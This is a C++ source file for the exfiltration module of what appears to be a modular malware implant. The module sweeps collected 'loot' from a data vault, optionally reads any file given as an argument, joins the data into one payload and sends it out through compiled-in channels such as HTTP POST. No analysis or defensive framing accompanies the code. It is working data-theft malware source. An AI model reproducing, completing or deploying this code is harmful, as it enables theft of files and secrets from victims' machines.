#include "modules/Exfiltration.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Obfuscation.hpp"
#include "utils/Logger.hpp"
#include "utils/DataVault.hpp"

#ifdef EXFIL_HTTP
    #include "modules/exfiltration/HttpPost.hpp"
#endif

Exfiltration::Exfiltration() {
    #ifdef EXFIL_HTTP
    methods.push_back(std::make_unique<HttpPostMethod>()); 
    #endif
}

bool Exfiltration::execute(const std::string& args) {
    LOG_INFO("Begin exfiltration")

    if (methods.empty()) {
        LOG_ERROR("No exfiltration methods available")
        return false;
    }

    auto loot = DataVault::Sweep();

    if (!args.empty()) {
        LOG_INFO("Manual exfiltration requested for {}", args)
        loot["MANUAL"] = FileUtils::ReadFile(args);
    }

    if (loot.empty()) {
        LOG_ERROR("Vault is empty, no data to exfiltrate")
        return false;
    }

    std::string aggregatedPayload;
    for (const auto& [category, data] : loot) {
        aggregatedPayload += "\n[" + category + "]\n" + data;
    }

    int successCount = 0;
    for (auto& method : methods) {
        if (method->canHandle(aggregatedPayload.size())) {
            LOG_INFO("Exfiltrating data via {}", method->getName())

            if (method->send("vault_dump", aggregatedPayload)) {
                LOG_SUCCESS("Successfully exfiltrated data via {}", method->getName())
                successCount++;
            } else {
                LOG_ERROR("Failed exfil via {}", method->getName())
            }
        }
    }

    return successCount > 0;
}

// can't really restore exfiltration, so just an empty function for now
void Exfiltration::restore() {}
